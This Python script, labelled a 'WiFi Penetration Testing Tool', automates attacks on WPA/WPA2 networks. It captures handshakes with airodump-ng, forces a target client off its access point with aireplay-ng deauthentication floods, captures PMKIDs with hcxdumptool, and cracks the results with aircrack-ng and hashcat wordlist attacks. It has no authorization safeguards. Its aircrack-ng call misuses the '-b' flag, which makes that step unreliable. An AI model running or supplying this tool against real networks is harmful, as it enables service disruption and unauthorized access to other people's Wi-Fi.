import argparse
import os
import subprocess
from datetime import datetime
import time
import threading

# Display the banner
def display_banner():
    banner = r"""
__        _______  _____  ______  _____            _            _   
\ \      / / __ \|  __ \|  ____|/ ____|          | |          | |  
 \ \ /\ / / |  | | |__) | |__  | (___   ___   ___| | ___   ___| |_ 
  \ V  V /| |  | |  ___/|  __|  \___ \ / _ \ / __| |/ _ \ / __| __|
   \_/\_/ | |__| | |    | |____ ____) | (_) | (__| | (_) | (__| |_ 
           \____/|_|    |______|_____/ \___/ \___|_|\___/ \___|\__|
                      WiFi Penetration Testing Tool
"""
    print(banner)
    print("Onwer: Rajeev rawat")
    print(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

# Start Airodump-ng to capture handshakes
def start_airodump(iface, ap_mac, channel):
    print(f"Starting airodump-ng on {iface}...")
    output_file = "capture"
    command = [
        "airodump-ng",
        "--bssid", ap_mac,
        "--channel", str(channel),
        "--write", output_file,
        iface
    ]
    subprocess.run(command)

# Perform deauthentication attack using Aireplay-ng
def deauth_attack(iface, ap_mac, target_mac):
    print(f"Starting deauthentication attack on {target_mac} via {ap_mac}...")
    command = [
        "aireplay-ng",
        "--deauth", "100",
        "-a", ap_mac,
        "-c", target_mac,
        iface
    ]
    subprocess.run(command)

# Crack the captured handshake using Aircrack-ng
def crack_handshake(handshake_file, wordlist_file):
    print(f"Starting Aircrack-ng on {handshake_file} with {wordlist_file}...")
    command = [
        "aircrack-ng",
        "-w", wordlist_file,
        "-b", handshake_file
    ]
    subprocess.run(command)

# Channel hopper for capturing across multiple channels
def channel_hopper(iface):
    channels = list(range(1, 12))  # Channels 1-11
    while True:
        for channel in channels:
            os.system(f"iwconfig {iface} channel {channel}")
            print(f"Switched to channel {channel}")
            time.sleep(2)

# Full capture process with Airodump-ng and Aireplay-ng
def capture_handshake_with_aircrack(iface, ap_mac, target_mac, channel):
    print("Starting handshake capture with Aircrack-ng tools...")

    # Start channel hopping in a separate thread
    if channel == 0:  # 0 indicates channel hopping
        hopper_thread = threading.Thread(target=channel_hopper, args=(iface,))
        hopper_thread.daemon = True
        hopper_thread.start()

    # Start Airodump-ng in a separate thread
    airodump_thread = threading.Thread(target=start_airodump, args=(iface, ap_mac, channel))
    airodump_thread.start()

    # Perform deauthentication attack
    deauth_attack(iface, ap_mac, target_mac)

# PMKID attack using hcxtools
def capture_pmkid_with_hcxtools(iface):
    print("Starting PMKID capture with hcxdumptool...")
    command = [
        "hcxdumptool",
        "-i", iface,
        "--enable_status=1",
        "-o", "pmkid.pcapng"
    ]
    subprocess.run(command)
    print("PMKID capture complete. File saved as pmkid.pcapng.")

# Crack PMKID with hashcat
def crack_pmkid_with_hashcat(pmkid_file, wordlist_file):
    print(f"Starting PMKID cracking with Hashcat on {pmkid_file}...")
    command = [
        "hashcat",
        "-m", "16800",
        pmkid_file,
        wordlist_file,
        "--force"
    ]
    subprocess.run(command)

# Main function
def main():
    display_banner()

    parser = argparse.ArgumentParser(description="WiFi Penetration Testing Tool")
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Subcommand for handshake capture
    handshake_parser = subparsers.add_parser("capture-handshake", help="Capture WPA/WPA2 handshakes")
    handshake_parser.add_argument("--iface", required=True, help="Network interface in monitor mode")
    handshake_parser.add_argument("--ap-mac", required=True, help="Access Point MAC address")
    handshake_parser.add_argument("--target-mac", required=True, help="Target MAC address")
    handshake_parser.add_argument("--channel", type=int, default=0, help="Wi-Fi channel (0 for hopping)")

    # Subcommand for PMKID capture
    pmkid_parser = subparsers.add_parser("capture-pmkid", help="Capture PMKID packets")
    pmkid_parser.add_argument("--iface", required=True, help="Network interface in monitor mode")

    # Subcommand for cracking handshake
    crack_parser = subparsers.add_parser("crack-handshake", help="Crack WPA/WPA2 handshake")
    crack_parser.add_argument("--handshake", required=True, help="Handshake file")
    crack_parser.add_argument("--wordlist", required=True, help="Wordlist file")

    # Subcommand for cracking PMKID
    crack_pmkid_parser = subparsers.add_parser("crack-pmkid", help="Crack PMKID with Hashcat")
    crack_pmkid_parser.add_argument("--pmkid", required=True, help="PMKID file")
    crack_pmkid_parser.add_argument("--wordlist", required=True, help="Wordlist file")

    args = parser.parse_args()

    if args.command == "capture-handshake":
        capture_handshake_with_aircrack(args.iface, args.ap_mac, args.target_mac, args.channel)
    elif args.command == "capture-pmkid":
        capture_pmkid_with_hcxtools(args.iface)
    elif args.command == "crack-handshake":
        crack_handshake(args.handshake, args.wordlist)
    elif args.command == "crack-pmkid":
        crack_pmkid_with_hashcat(args.pmkid, args.wordlist)

if __name__ == "__main__":
    main()
